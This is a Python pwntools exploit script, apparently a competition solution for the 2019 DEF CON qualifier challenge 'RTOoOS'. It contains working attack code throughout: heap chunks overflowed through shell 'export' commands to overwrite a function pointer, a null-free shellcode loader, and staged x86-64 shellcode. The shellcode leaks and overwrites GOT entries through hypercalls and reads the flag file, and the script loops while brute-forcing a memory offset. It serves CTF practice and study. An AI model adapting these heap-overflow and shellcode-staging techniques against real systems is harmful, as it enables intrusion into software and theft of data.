from pwn import *
def export(key,val):
    p.recvuntil("[RTOoOS> ")
    p.sendline("export {}={}".format(key,val))
def unset(key):
    p.recvuntil("[RTOoOS> ")
    p.sendline("unset {}".format(key))
def cat(fname):
    p.recvuntil("[RTOoOS> ")
    p.sendline("cat {}".format(fname))
    data = p.recvuntil("[RTOoOS> ").strip("[RTOoOS> ")
    return data
def env():
    p.recvuntil("[RTOoOS> ")
    p.sendline("env")
    data = p.recvuntil("[RTOoOS> ").strip("[RTOoOS> ").split("\n")
    ret = {}
    for x in data:
        if x=='':
            continue
        l = x.split("=")
        ret[l[0]]=l[1]
    p.sendline("ls /")
    return ret

def cat (fname):
    ret = shellcraft.amd64.pushstr(fname)
    ret += "mov rdi, rsp\n"
    ret += "call .cat\n"
    return ret

def mkPrintf (target):
    ret = '.printf:\n'
    for x in target:
        ret += "mov rdi, 0x%x\n"%ord(x)
        ret += "call .putchar\n"
    ret += 'ret\n'
    return ret

def dump(offset, n):
    offset = offset & 0xffffffffffffffff
    ret = '''
    mov rsi, 0x%x
    mov rcx, 0x%x
    .loop:
    mov rdi, rsi
    call .puts
    add rsi, 0x1
    dec rcx
    cmp rcx, 0x0
    jnz .loop
    '''%(offset, n)
    return ret

def hread(ptr, size):
  ptr = ptr & 0xffffffffffffffff
  ret = '''
    mov rdi, 0x%x
    mov rsi, 0x%x
    call .read
  '''%(ptr, size)
  return ret

OFFSET = 0x91000 #0x2000000

ATOI_GOT = 0x2040
STR_GOT = 0x2170

def main_shellcode():
    pay = ''
    pay += dump (-OFFSET + ATOI_GOT, 1)
    pay += "call .printf\n"
    pay += hread (-OFFSET + STR_GOT, 8)
    pay += cat ("flag")
    '''
    pay += cat("crux")
    pay += "call .printf\n"
    pay += dump(-0x10000, 0x10000)
    #pay += dump(0x400000, 0x100)
    pay += "call .printf\n"
    '''
    code = '''
    {}
    hlt
    .read:
        mov rax,rdi
        mov edi, 0x63
        out dx,al
        ret
    .putchar:
        mov rax,rdi
        mov edi, 0x61
        out dx,al
        ret
    .puts:
        mov rax,rdi
        mov edi, 0x64
        out dx,al
        ret
    .cat:
        mov rax,rdi
        mov edi,0x66
        out dx,al
        ret
    .leak:
        mov rax,rdi
        mov rdi,0x62
        out dx,al
        ret
    .ls:
        mov rax,rdi
        mov rdi,0x65
        out dx,al
        ret
     .default:
        mov rdi, 0x42
        out dx,al
        ret
    .crash:
        mov rsp,0x1029102910291
        push rax
    '''.format(pay+mkPrintf("DARAMG"))
    return asm(code)
def loader():
    code = '''
    xor rdi,rdi
    mov di,0x13F0
    mov rax,rdi
    mov r15,rdi
    xor rdx,rdx
    mov dl,0x63
    mov rdi,rdx
    xor rsi,rsi
    mov si, {}
    out dx,al
    call r15
    jmp $
    '''.format(0x1FF)

    sc = asm(code)
    assert(not "\x00" in sc)
    return sc
if __name__ == "__main__":
    context.os = 'linux'
    context.arch = 'amd64'
    OFFSET = 0x8e000
    while True:
        print hex(OFFSET)
        try:
            p = remote("rtooos.quals2019.oooverflow.io", 5000)
            p.recvuntil("Submission Stardate 37357.84908798814\n")
            log.info("connected, starting exploit")
            for i in range(1,6):
                export(str(i),"a"*0x1E0+"\x00")
                log.info("made chunk %d"%i)
            addr = 0x880 #check function
            export(str(6),"\xC0"*0x1E0+p16(addr)+"\x00") #overwrite pointer of 1
            export("7","1"*0x1a2+"$6")
            export("1",loader())
            sleep(1)
            p.sendline("cat honcho") # trigger loader
            p.recvuntil("[RTOoOS> ")
            log.info("triggering stager, sending shellcode")
            p.sendline(main_shellcode()) # read shellcode to loader

            leak = p.recvuntil("DARAMG")[:-7]
            atoi = leak.ljust(8,'\x00')
            tmp = u64(atoi)
            print hex(tmp)
            if tmp < 0x10000: raise
            p.send(atoi)
            p.interactive()
        except: pass
        finally:
            p.close()
            OFFSET += 0x1000